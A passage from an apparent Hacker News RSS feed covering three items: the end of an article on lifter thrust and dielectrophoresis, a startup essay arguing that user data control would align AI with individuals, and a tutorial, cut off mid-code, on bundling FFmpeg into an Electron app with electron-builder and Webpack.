<p><span>A well known effect called dielectrophoresis may also contribute to the device’s thrust. This is an effect whereby dielectric material in an asymmetrc electric field becomes polarized and moves towards the larger electrode. In a fluid dielectric medium such as air or liquid, dielectrophoresis can cause a continuous flow of dieletric material from one electrode to another. The more intense the electric field the greater the effect. Dieletrophoresis is consitent with experiemental results shown by encapsulating the electrodes.</span></p>

<p><img loading="lazy" title="lifter_plot" src="http://electricmuseum.com/wp-content/uploads/lifter_plot1.gif" alt="lifter_plot" width="400" height="304"></p>
</div>

</div><!-- .entry -->


</article>

				
			</div><!-- #content -->

			
		</div><!-- #primary -->

		

<!-- #right-sidebar -->


	</div><!-- #content-wrap -->

	

	</main><!-- #main -->

	
	
	
		
<!-- #footer -->

	
	
</div></div>]]>
            </description>
            <link>https://electricmuseum.com/312/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25723430</guid>
            <pubDate>Mon, 11 Jan 2021 02:12:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The AI war is not over yet]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25723081">thread link</a>) | @michaeljelly
<br/>
January 10, 2021 | https://www.ethi.me/essays/the-ai-war-is-not-over-yet | <a href="https://web.archive.org/web/*/https://www.ethi.me/essays/the-ai-war-is-not-over-yet">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong><em>No TL;DR this time, sorry xxx</em></strong></p><p>At the end of <a href="https://importantinformation.substack.com/p/facebook-wont-win-the-ai-war">my last essay</a>, we gave up on hope. Hope isn’t good enough when the stakes are this high.</p><p>The only way to ensure that future AIs have incentives that are aligned with the individuals that interact with them, is by building an incentive structure. One powerful enough to force the organisations that build AI to have no other choice but to align with individuals.</p><p>How can you force Facebook, Google, Amazon, Twitter, Snap and TikTok to all swing their priorities away from serving advertisers to serving individuals?</p><p>You lower switching costs, making platform-exit a real option for individuals and therefore making anti-user behaviour extremely costly.</p><h4>Forcing AI organisations to align incentives with individuals</h4><p>We need to give individuals the power to enforce accountability on companies and AI systems that are not aligned with individuals.</p><p>Other than accountability through democracy, it seems like there aren’t many ways individuals can exercise power against the tech giants.</p><p>The way to give individuals that power is to build tools that help them to easily understand and control what data about them AIs/companies can access. Given that AIs need data to know us well &amp; perform successfully, if individuals only give data where they benefit and can revoke access en-masse when they don’t, then AIs have to be aligned with users or they won’t be able to compete.</p><p>The ability for individuals to withdraw their data en-masse would be a powerful accountability mechanism &amp; incentive to do what’s best for individuals. If we can build that future where individuals have fluid, granular control of the data companies collect about them &amp; that AIs use, we’re 90% of the way to achieving AI-individual alignment, because we have created <strong>the right incentive-system.</strong></p><h2>The path to fluid, granular data control</h2><p>But how could individuals control what AIs know about them? Most people don’t even know what companies like Facebook, and Google know about them. Just understanding what companies and their AI systems know about you is hard. Data isn’t easy to understand &amp; <strong>companies don’t *want* to tell you</strong>.</p><p>But before you truly control *anything* you need to understand it. You need to know:</p><ul role="list"><li>what data exists about you</li><li>who has it</li><li>what does it mean</li><li>what do they use it for</li></ul><p>Then, once you understand it, you can:</p><ul role="list"><li>reclaim data to keep for yourself</li><li>decide who gets to access it</li><li>decide what they can use it for</li><li>delete it from anywhere you want</li></ul><p>That’s a start, and would force these companies to perk up in their respect for individuals as humans, not just as “users”.</p><p>But even then you still don’t have true autonomy over your data. You’re fighting with companies over what *they* do with it. There’s a fundamental constraint on the possibilities of what your data could be used for, which is the incentives of the companies that hold it.</p><h2>When individuals have control</h2><p>If there was a company that didn’t have outside incentives for they use your data, that only served you, then your incentives would be aligned. Imagine if your data was no longer constrained by the imagination and incentives of ad platforms like Facebook and Google. What happens when the primary purpose of your data existing isn’t to make money selling you ads? What happens when data is broken out of corporate silos where it sits providing only a partial picture of who you are? to represent the full you? </p><figure><p><img src="https://uploads-ssl.webflow.com/5e2da1d25b8bed7662b12293/5ffba40b3c5ff12188d14361_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F7b3e7d48-c412-41ee-88df-65ab2e031032_1000x667.jpeg" alt="human hand holding plasma ball"></p><figcaption>Giving users control will unlock magic.</figcaption></figure><p>It’s hard to grasp the magnitude of this shift except by analogy. When computing was only for businesses, the question was asked: but how would this be useful to consumers? <strong>A personal computer is pointless, nothing to use it for. The software hadn’t been built to make them useful, because there were no personal computers or users to build it for. 🐔 &amp; 🥚</strong></p><p>Right now businesses use personal data for their own ends. There are no consumer use-cases other than ad-driven feeds, beyond a hobbyist fringe tinkering with quantified self. For students of technology/Apple history: a hobbyist fringe tinkering with a tool that businesses find extremely valuable &amp; powerful. Sound familiar?</p><h2>New tools: from businesses to consumers</h2><p>With new and powerful tools, businesses come first. They have the willingness to pay &amp; the urgent need. But: consumer companies grow bigger.</p><p><strong>Computing:</strong> IBM (1911) &lt; Apple (1976)</p><p><strong>Social Networking:</strong> LinkedIn (2002) &lt; Facebook (2004)</p><p><strong>Data infrastructure:</strong> Segment (2011) &lt; ???</p><p>When personal data gets centred around the user, and users are empowered to choose what it gets used for, the use-cases will explode. Data will become a tool for thought, introspection, self-improvement, health, finding friends and partners, and for building personalised AI. Data will make us superhuman.</p><h2><strong>Who will win the AI war</strong></h2><p>There is a huge amount of responsibility placed on the company entrusted with the user’s data. Sufficiently good and complete data will give that company the power to manipulate users even more than Facebook and Google can do now. Do you really want that power to be held by companies selling ads?</p><p>Trust becomes the key differentiator in this world. Individuals need to trust that the company behind the AI puts their goals first. That the company wins when they win.</p><p>The real question here is: if you *can* control what AIs/companies know about you, will you let any AI access <strong>all your data</strong>? An AI system with all your data that’s aligned perfectly with you sounds incredibly useful. But who could you trust to make one? It’s difficult to pick a company - only Apple is making a case for themselves. Really you could only trust a company that has no external incentives. A company built entirely around you.</p><ul role="list"><li>If they are funded by advertisers targeting you with ads - NOPE!</li><li>If they haven’t been transparent with how they use your data - NOPE!</li></ul><p>i.e. ultimately this is no company we currently associate with AI today.</p><p>This company would need to be built from the ground up to be focused around serving the human user. Its revenue would need to come directly from users themselves - giving it no outside incentives. It would need to be the most transparent and trusted company in the world. It would give users true control. By being the most user-focused ethical, trusted company, it would have an unassailable comparative advantage over companies with baggage.</p><p>The company would need to stake its reputation on its pro-user behaviour.</p><p>No platitudes, instead: extreme commitment. Not “Don’t be evil”, but “Be Good”. Prioritising individuals’ autonomy, joy, and self-actualisation above profit. By being so pro-user, ironically it could become the most valuable company in the world.</p><h2>Time to shill what I’m building</h2><p>You might have guessed, but that’s the company we’re building at <a href="https://twitter.com/GetEthi">@GetEthi</a>. We're helping individuals to understand and control their data, and we'll shortly be releasing our first "use-case" for people's data.</p><p>It's definitely a bit ridiculous to claim we might one-day be the most trusted company in the world, and that we have a chance in hell of building the best AI, but <a href="https://www.ycombinator.com/library/4D-yc-s-essential-startup-advice">Sam Altman always points out</a> that it is nearly always better to take the more ambitious path. So that’s the plan.</p><p>We’ve called it Ethi for a reason. Here are our extreme commitments:</p><ul role="list"><li>Ethi is short for ethical, and we want to be held to that standard.</li><li>We will make no revenue that isn’t from our users.</li><li>Your data will only be used in ways you <strong>clearly consent to</strong>, that benefit you.</li><li>Our motto is “Be Good”.</li></ul><p>We’ll be competing with the most valuable companies in the world. The most powerful companies in the world. Our existence is a direct critique of how Facebook, Google, etc. have done business. They can’t even copy us because they’re too locked into their ad-driven business model. This is what’s called “counter-positioning”.</p><p>Personally, I’m so excited to be building this company. Putting individuals in control of their data is my life’s mission. It’s the best work I could possible be doing. If Ethi succeeds in our grandest mission, it will ensure that individuals remain autonomous in a world where AIs grow more powerful and exponentially increasing amounts of data get collected about us. If individuals can understand, control and use their data how they see fit, the chance of AI-individual alignment will be hugely increased, &amp; individuals will have data-enhanced superpowers in understanding themselves, connecting with others, &amp; navigating the world’s complexity.</p><p>If I’ve done my job right in this essay and the last, you’re hyped and you want to join us on this journey. Sign up at https://ethi.me to get started controlling your data. This is just the beginning.</p><p>DMs, replies, thoughts, feedback, all appreciated, email is mike at ethi.me, follow me on Twitter @michaeljelly.</p><p>‍</p><p><em>At </em><a href="https://www.ethi.me/"><em>Ethi</em></a><em>, we help you to understand and control the data that companies collect about you. We’re making it easier for you to extract yourself from Facebook, Google and ore. We hope to build an accountability mechanism that makes sure the AIs that win will serve users.</em></p><p><em>You are not the product at Ethi, you are our customer - our only customer! This aligns our incentives with yours, and that we win when you win. We think if data collection and data-use remain as opaque as they currently are, users will never have the information or tools they need to leave platforms that exploit them. </em></p></div></div>]]>
            </description>
            <link>https://www.ethi.me/essays/the-ai-war-is-not-over-yet</link>
            <guid isPermaLink="false">hacker-news-small-sites-25723081</guid>
            <pubDate>Mon, 11 Jan 2021 01:36:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Electron with FFmpeg and Webpack]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25722231">thread link</a>) | @cryogenicplanet
<br/>
January 10, 2021 | https://blog.modfy.video/Building-Electron-with-FFmpeg | <a href="https://web.archive.org/web/*/https://blog.modfy.video/Building-Electron-with-FFmpeg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>At Modfy, we are developing a desktop wrapper for <a href="http://modfy.video/" target="_blank" rel="noreferrer">modfy.video</a> and I wanted to share how to package FFmpeg with Electron using Webpack. I think there is a lot of good work based around this, but it wasn’t very clearly documented, and I ran into a lot of issues, so I thought I’d document what I used here.</p><h2 id="the-groundwork">The groundwork</h2><h2 id="electron">Electron</h2><p>I really like typescript and react, so I’d recommend using this boilerplate, as it does a lot of the heavy lifting in that regard.</p><p><a href="https://github.com/diego3g/electron-typescript-react" target="_blank" rel="noreferrer">https://github.com/diego3g/electron-typescript-react</a></p><div><pre><p><span>1</span><span>git</span><span> clone https://github.com/diego3g/electron-typescript-react.git project</span></p></pre></div><h2 id="ffmpeg">FFmpeg</h2><p>To ship a binary like FFmpeg with an application, we need to use the concept of static binaries. These are essentially binaries compiled with all their dependencies into one file that can be directly executed. Thankfully we don’t need to make these binaries ourselves, as other people have done the great work of compiling these binaries.</p><p>For example, the linux binaries are compiled here: <a href="https://johnvansickle.com/ffmpeg/" target="_blank" rel="noreferrer">https://johnvansickle.com/ffmpeg/</a></p><p>These binaries can be used wherever you’d like inside any ffmpeg wrapper, such as <em>fluent-ffmpeg</em>, or calling them yourself inside a <em>child.spawn</em> . For the rest of the tutorial we are going to demo this using <em>fluent-ffmpeg</em>, but it shouldn’t really change anything.</p><p>We can find all these static binaries bundled together for us in this repo: <a href="https://github.com/pietrop/ffmpeg-static-electron" target="_blank" rel="noreferrer">https://github.com/pietrop/ffmpeg-static-electron</a></p><p>It does a great job setting things up, but can be improved for the final compile step to actually import the files into electron correctly.</p><h2 id="building">Building</h2><h2 id="electron-builder">Electron-builder</h2><p>The boilerplate uses <code>electron-builder</code> to build out electron, which simplifies quite a bit but can still be a lot to learn and figure out. The documentation on <a href="http://electron.build/" target="_blank" rel="noreferrer">electron.build</a> is a good place to start.</p><p>The boilerplate will give you this within your build step in <code>package.json</code>, which is where all the electron build configs will go.</p><div><pre><p><span>1</span><span>"build"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>    </span><span>"appId"</span><span>:</span><span> </span><span>"your.id"</span><span>,</span><span></span></p><p><span>3</span><span>    </span><span>"mac"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>      </span><span>"category"</span><span>:</span><span> </span><span>"public.app-category.video"</span><span></span></p><p><span>5</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>6</span><span>    </span><span>"directories"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>7</span><span>      </span><span>"output"</span><span>:</span><span> </span><span>"packages"</span><span></span></p><p><span>8</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>9</span><span>    </span><span>"files"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>10</span><span>      </span><span>"package.json"</span><span>,</span><span></span></p><p><span>11</span><span>      </span><span>"dist/**"</span><span></span></p><p><span>12</span><span>    </span><span>]</span><span></span></p><p><span>13</span><span>  </span><span>}</span><span>,</span></p></pre></div><p>While this is a very basic starting point, there is a lot more to add here to actually get the build working. There are tons of good tutorials on this, but I’ll still go over it here briefly for posterity.</p><p>For each operating system you want to build to, you must choose your targets. For example, for Linux we want a build target as <code>.deb</code>, for debain operation systems. (<a href="https://www.electron.build/configuration/linux" target="_blank" rel="noreferrer">https://www.electron.build/configuration/linux</a>)</p><p>Within each target, we can add more changes and customization specific to that target.</p><p>For <code>.dmg</code> on MacOS, we need to make a few customizations to get the current dmg installer.</p><p>The contents determine how the <code>dmg</code> looks on MacOS when mounted.</p><div><pre><p><span>1</span><span>"dmg"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>      </span><span>"icon"</span><span>:</span><span> </span><span>"build/icon.icns"</span><span>,</span><span></span></p><p><span>3</span><span>      </span><span>"iconSize"</span><span>:</span><span> </span><span>100</span><span>,</span><span></span></p><p><span>4</span><span>      </span><span>"contents"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>5</span><span>        </span><span>{</span><span></span></p><p><span>6</span><span>          </span><span>"x"</span><span>:</span><span> </span><span>380</span><span>,</span><span></span></p><p><span>7</span><span>          </span><span>"y"</span><span>:</span><span> </span><span>280</span><span>,</span><span></span></p><p><span>8</span><span>          </span><span>"type"</span><span>:</span><span> </span><span>"link"</span><span>,</span><span></span></p><p><span>9</span><span>          </span><span>"path"</span><span>:</span><span> </span><span>"/Applications"</span><span></span></p><p><span>10</span><span>        </span><span>}</span><span>,</span><span></span></p><p><span>11</span><span>        </span><span>{</span><span></span></p><p><span>12</span><span>          </span><span>"x"</span><span>:</span><span> </span><span>110</span><span>,</span><span></span></p><p><span>13</span><span>          </span><span>"y"</span><span>:</span><span> </span><span>280</span><span>,</span><span></span></p><p><span>14</span><span>          </span><span>"type"</span><span>:</span><span> </span><span>"file"</span><span></span></p><p><span>15</span><span>        </span><span>}</span><span></span></p><p><span>16</span><span>      </span><span>]</span><span></span></p><p><span>17</span><span>    </span><span>}</span><span>,</span></p></pre></div><h3 id="build-resources">Build resources</h3><p>For extra resources related to the build itself, we need to make a folder called <code>build</code> at the root of our project, where we can store these files.</p><p>We can add this directory to the build like this:</p><div><pre><p><span>1</span><span>"directories"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>      </span><span>"output"</span><span>:</span><span> </span><span>"packages"</span><span>,</span><span></span></p><p><span>3</span><span>      </span><span>"buildResources"</span><span>:</span><span> </span><span>"build"</span><span></span></p><p><span>4</span><span>    </span><span>}</span><span>,</span></p></pre></div><p>This <code>build</code> folder will contain icons and other build assets.</p><h3 id="generating-icons">Generating icons</h3><p>For the <code>build</code> to work correctly we need two icon files; one <code>.icns</code>, and one <code>.ico</code>, for MacOS and Windows respectively. The Linux icon is generated from the MacOS icon.</p><p>The image should be square to make these icons. For me, making these icons was quite a bit of a pain, and I had to try various tools, so you may have to experiment a bit.</p><p>For <code>icns</code> I would recommend <a href="https://www.npmjs.com/package/make-icns" target="_blank" rel="noreferrer">https://www.npmjs.com/package/make-icns</a></p><div><pre><p><span>1</span><span>npx mk-icns </span><span>&lt;</span><span>png-file-path</span><span>&gt;</span><span> </span><span>&lt;</span><span>destination-directory</span><span>&gt;</span></p></pre></div><p>Other options: <a href="https://www.electron.build/icons" target="_blank" rel="noreferrer">https://www.electron.build/icons</a></p><p>A template of a final build config (not the exact config for modfy)</p><div><pre><p><span>1</span><span>"build"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>    </span><span>"appId"</span><span>:</span><span> </span><span>"com.app.id"</span><span>,</span><span></span></p><p><span>3</span><span>    </span><span>"productName"</span><span>:</span><span> </span><span>"Modfy"</span><span>,</span><span></span></p><p><span>4</span><span>    </span><span>"copyright"</span><span>:</span><span> </span><span>"Copyright © 2020 Modfy Inc"</span><span>,</span><span></span></p><p><span>5</span><span>    </span><span>"mac"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>6</span><span>      </span><span>"category"</span><span>:</span><span> </span><span>"public.app-category.video"</span><span>,</span><span></span></p><p><span>7</span><span>      </span><span>"artifactName"</span><span>:</span><span> </span><span>"${productName}-${version}-${arch}.${ext}"</span><span></span></p><p><span>8</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>9</span><span>    </span><span>"linux"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>10</span><span>      </span><span>"category"</span><span>:</span><span> </span><span>"Chat;GNOME;GTK;Network;InstantMessaging"</span><span>,</span><span></span></p><p><span>11</span><span>      </span><span>"packageCategory"</span><span>:</span><span> </span><span>"GNOME;GTK;Network;InstantMessaging"</span><span>,</span><span></span></p><p><span>12</span><span>      </span><span>"description"</span><span>:</span><span> </span><span>"Your app description"</span><span>,</span><span></span></p><p><span>13</span><span>      </span><span>"target"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>14</span><span>        </span><span>"deb"</span><span>,</span><span></span></p><p><span>15</span><span>        </span><span>"AppImage"</span><span>,</span><span></span></p><p><span>16</span><span>        </span><span>"snap"</span><span></span></p><p><span>17</span><span>      </span><span>]</span><span>,</span><span></span></p><p><span>19</span><span>      </span><span>"artifactName"</span><span>:</span><span> </span><span>"${productName}-${version}-${arch}.${ext}"</span><span></span></p><p><span>20</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>21</span><span>    </span><span>"deb"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>22</span><span>      </span><span>"synopsis"</span><span>:</span><span> </span><span>"Modfy Desktop App"</span><span></span></p><p><span>23</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>24</span><span>    </span><span>"snap"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>25</span><span>      </span><span>"synopsis"</span><span>:</span><span> </span><span>"Modfy Desktop App"</span><span></span></p><p><span>26</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>27</span><span>    </span><span>"dmg"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>28</span><span>      </span><span>"icon"</span><span>:</span><span> </span><span>"build/icon.icns"</span><span>,</span><span></span></p><p><span>29</span><span>      </span><span>"iconSize"</span><span>:</span><span> </span><span>100</span><span>,</span><span></span></p><p><span>30</span><span>      </span><span>"contents"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>31</span><span>        </span><span>{</span><span></span></p><p><span>32</span><span>          </span><span>"x"</span><span>:</span><span> </span><span>380</span><span>,</span><span></span></p><p><span>33</span><span>          </span><span>"y"</span><span>:</span><span> </span><span>280</span><span>,</span><span></span></p><p><span>34</span><span>          </span><span>"type"</span><span>:</span><span> </span><span>"link"</span><span>,</span><span></span></p><p><span>35</span><span>          </span><span>"path"</span><span>:</span><span> </span><span>"/Applications"</span><span></span></p><p><span>36</span><span>        </span><span>}</span><span>,</span><span></span></p><p><span>37</span><span>        </span><span>{</span><span></span></p><p><span>38</span><span>          </span><span>"x"</span><span>:</span><span> </span><span>110</span><span>,</span><span></span></p><p><span>39</span><span>          </span><span>"y"</span><span>:</span><span> </span><span>280</span><span>,</span><span></span></p><p><span>40</span><span>          </span><span>"type"</span><span>:</span><span> </span><span>"file"</span><span></span></p><p><span>41</span><span>        </span><span>}</span><span></span></p><p><span>42</span><span>      </span><span>]</span><span></span></p><p><span>43</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>44</span><span>    </span><span>"win"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>45</span><span>      </span><span>"target"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>46</span><span>        </span><span>{</span><span></span></p><p><span>47</span><span>          </span><span>"target"</span><span>:</span><span> </span><span>"nsis"</span><span>,</span><span></span></p><p><span>48</span><span>          </span><span>"arch"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>49</span><span>            </span><span>"x64"</span><span>,</span><span></span></p><p><span>50</span><span>            </span><span>"ia32"</span><span></span></p><p><span>51</span><span>          </span><span>]</span><span></span></p><p><span>52</span><span>        </span><span>}</span><span></span></p><p><span>53</span><span>      </span><span>]</span><span>,</span><span></span></p><p><span>54</span><span>      </span><span>"icon"</span><span>:</span><span> </span><span>"build/icon.ico"</span><span>,</span><span></span></p><p><span>55</span><span>      </span><span>"artifactName"</span><span>:</span><span> </span><span>"${productName}-${version}.${ext}"</span><span>,</span><span></span></p><p><span>56</span><span>      </span><span>"publisherName"</span><span>:</span><span> </span><span>"Modfy Inc."</span><span></span></p><p><span>57</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>58</span><span>    </span><span>"directories"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>59</span><span>      </span><span>"output"</span><span>:</span><span> </span><span>"packages"</span><span>,</span><span></span></p><p><span>60</span><span>      </span><span>"buildResources"</span><span>:</span><span> </span><span>"build"</span><span></span></p><p><span>61</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>62</span><span>    </span><span>"files"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>63</span><span>      </span><span>"package.json"</span><span>,</span><span></span></p><p><span>64</span><span>      </span><span>"dist/**/*"</span><span>,</span><span></span></p><p><span>65</span><span>    </span><span>]</span><span>,</span><span></span></p><p><span>66</span><span>  </span><span>}</span><span>,</span></p></pre></div><h2 id="webpack">Webpack</h2><p>The boilerplate comes with a good base webpack config, but we need to modify it to deal with <code>ffmpeg</code> correctly.</p><p>The base webpack config in <code>webpack/electron.config.js</code>:</p><div><pre><p><span>1</span><span>const</span><span> path </span><span>=</span><span> </span><span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>const</span><span> rootPath </span><span>=</span><span> path</span><span>.</span><span>resolve</span><span>(</span><span>__dirname</span><span>,</span><span> </span><span>".."</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span></span></p><p><span>5</span><span>module</span><span>.</span><span>exports </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>6</span><span>  resolve</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>7</span><span>    extensions</span><span>:</span><span> </span><span>[</span><span>".tsx"</span><span>,</span><span> </span><span>".ts"</span><span>,</span><span> </span><span>".js"</span><span>]</span><span></span></p><p><span>8</span><span>  </span><span>}</span><span>,</span><span></span></p><p><span>9</span><span>  devtool</span><span>:</span><span> </span><span>"source-map"</span><span>,</span><span></span></p><p><span>10</span><span>  entry</span><span>:</span><span> path</span><span>.</span><span>resolve</span><span>(</span><span>rootPath</span><span>,</span><span> </span><span>"electron"</span><span>,</span><span> </span><span>"main.ts"</span><span>)</span><span>,</span><span></span></p><p><span>11</span><span>  target</span><span>:</span><span> </span><span>"electron-main"</span><span>,</span><span></span></p><p><span>12</span><span>  module</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>13</span><span>    rules</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>14</span><span>      </span><span>{</span><span></span></p><p><span>15</span><span>        test</span><span>:</span><span> </span><span>/\.(js|ts|tsx)$/</span><span>,</span><span></span></p><p><span>16</span><span>        exclude</span><span>:</span><span> </span><span>/node_modules/</span><span>,</span><span></span></p><p><span>17</span><span>        use</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>18</span><span>          loader</span><span>:</span><span> </span><span>"babel-loader"</span><span></span></p><p><span>19</span><span>        </span><span>}</span><span></span></p><p><span>20</span><span>      </span><span>}</span><span></span></p><p><span>21</span><span>    </span><span>]</span><span></span></p><p><span>22</span><span>  </span><span>}</span><span>,</span><span></span></p><p><span>23</span><span>  node</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>24</span><span>    __dirname</span><span>:</span><span> </span><span>false</span><span></span></p><p><span>25</span><span>  </span><span>}</span><span>,</span><span></span></p><p><span>26</span><span>  output</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>27</span><span>    path</span><span>:</span><span> path</span><span>.</span><span>resolve</span><span>(</span><span>rootPath</span><span>,</span><span> </span><span>"dist"</span><span>)</span><span>,</span><span></span></p><p><span>28</span><span>    filename</span><span>:</span><span> </span><span>"[name].js"</span><span></span></p><p><span>29</span><span>  </span><span>}</span><span></span></p><p><span>30</span><span></span><span>}</span><span>;</span></p></pre></div><p>First the obvious step, change the entry point to whatever your main process file is. If you are using a preload, then that should be its only entry point.</p><div><pre><p><span>1</span><span>entry</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>    main</span><span>:</span><span> path</span><span>.</span><span>resolve</span><span>(</span><span>rootPath</span><span>,</span><span> </span><span>'src'</span><span>,</span><span> </span><span>'mainProcess'</span><span>,</span><span> </span><span>'main.ts'</span><span>)</span><span>,</span><span></span></p><p><span>3</span><span>    preload</span><span>:</span><span> path</span><span>.</span><span>resolve</span><span>(</span><span>rootPath</span><span>,</span><span> </span><span>'src'</span><span>,</span><span> </span><span>'mainProcess'</span><span>,</span><span> </span><span>'preload.ts'</span><span>)</span><span></span></p><p><span>4</span><span>  </span><span>}</span><span>,</span></p></pre></div><h2 id="webpack--ffmpeg-static">Webpack + FFmpeg Static</h2><p>Now we can move on to the meat of how to configure <code>ffmpeg-static-electron</code> and webpack correctly!</p><p>First, we need to make the <code>ffmpeg-static-electron</code> package an ‘external’, which means it will not be bundled into the files itself.</p><div><pre><p><span>1</span><span>externals</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>    </span><span>'ffmpeg-static-electron'</span><span>:</span><span> </span><span>'commonjs2 ffmpeg-static-electron'</span><span></span></p><p><span>3</span><span>  </span><span>}</span><span>,</span></p></pre></div><p>Now that we have configured the package to be an ‘external’, we should copy over the package files into the <code>dist</code> folder. We can be smart here, and only copy over the corresponding OS files, rather than copy of all of them. We can use this kind of selective copying in a few places, which will be highlighted later on.</p><p>To copy files in webpack, we have to use <code>copy-webpack-plugin</code>.</p><p>Let’s find the paths of the files we want first; we want the <code>index.js, package.json</code> files regardless, but we also want <code>/bin/{os}/{arch}/ffmpeg</code>.</p><div><pre><p><span>1</span><span>const</span><span> ffmpegStaticModulePath </span><span>=</span><span> path</span><span>.</span><span>join</span><span>(</span><span></span></p><p><span>2</span><span>  </span><span>"node_modules"</span><span>,</span><span></span></p><p><span>3</span><span>  </span><span>"ffmpeg-static-electron"</span><span></span></p><p><span>4</span><span></span><span>)</span><span>;</span><span></span></p><p><span>5</span><span></span></p><p><span>6</span><span></span><span>let</span><span> platform </span><span>=</span><span> os</span><span>.</span><span>platform</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span></span><span></span></p><p><span>8</span><span></span><span>if</span><span> </span><span>(</span><span>platform </span><span>==</span><span> </span><span>"darwin"</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>  platform </span><span>=</span><span> </span><span>"mac"</span><span>;</span><span></span></p><p><span>10</span><span></span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>platform </span><span>==</span><span> </span><span>"win32"</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>11</span><span>  platform </span><span>=</span><span> </span><span>"win"</span><span>;</span><span></span></p><p><span>12</span><span></span><span>}</span><span></span></p><p><span>13</span><span></span></p><p><span>14</span><span></span><span>const</span><span> platformArchPath </span><span>=</span><span> path</span><span>.</span><span>join</span><span>(</span><span></span></p><p><span>15</span><span>  ffmpegStaticModulePath</span><span>,</span><span></span></p><p><span>16</span><span>  </span><span>"bin"</span><span>,</span><span></span></p><p><span>17</span><span>  platform</span><span>,</span><span></span></p><p><span>18</span><span>  os</span><span>.</span><span>arch</span><span>(</span><span>)</span><span></span></p><p><span>19</span><span></span><span>)</span><span>;</span></p></pre></div><p>This will create the file paths we need to copy over our files.</p><div><pre><p><span>1</span><span>plugins</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>2</span><span>  </span><span>new</span><span> </span><span>CopyPlugin</span><span>(</span><span>{</span><span></span></p><p><span>3</span><span>    patterns</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>4</span><span>      </span><span>{</span><span></span></p><p><span>5</span><span>        </span><span>from</span><span>:</span><span> path</span><span>.</span><span>resolve</span><span>(</span><span>ffmpegStaticModulePath</span><span>,</span><span> </span><span>"index.js"</span><span>)</span><span>,</span><span></span></p><p><span>6</span><span>        to</span><span>:</span><span> ffmpegStaticModulePath</span></p><p><span>7</span><span>      </span><span>}</span><span>,</span><span></span></p><p><span>8</span><span>      </span><span>{</span><span></span></p><p><span>9</span><span>        </span><span>from</span><span>:</span><span> path</span><span>.</span><span>resolve</span><span>(</span><span>ffmpegStaticModulePath</span><span>,</span><span> </span><span>"package.json"</span><span>)</span><span>,</span><span></span></p><p><span>10</span><span>        to</span><span>:</span><span> ffmpegStaticModulePath</span></p><p><span>11</span><span>      </span><span>}</span><span>,</span><span></span></p><p><span>12</span><span>      </span><span>{</span><span></span></p><p><span>13</span><span>        </span><span>from</span><span>:</span><span> platformArchPath</span><span>,</span><span></span></p><p><span>14</span><span>        to</span><span>:</span><span> platformArchPath</span></p><p><span>15</span><span>      </span><span>}</span><span></span></p><p><span>16</span><span>    </span><span>]</span><span></span></p><p><span>17</span><span>  </span><span>}</span><span>)</span><span></span></p><p><span>18</span><span></span><span>]</span><span>;</span></p></pre></div><p>Now we have created a <code>dist/node_modules/</code> folder with FFmpeg. <strong>This is very important, as this is the folder we will be using for development.</strong></p><p>The last step with webpack is to make the copied files an executable file.</p><p>For this, we need to add a build hook (yes webpack has hooks now). So we can use <code>webpack-hook-plugin</code> to create this build hook.</p><div><pre><p><span>1</span><span>new</span><span> </span><span>WebpackHookPlugin</span><span>(</span><span>{</span><span></span></p><p><span>2</span><span>  onBuildStart</span><span>:</span><span> 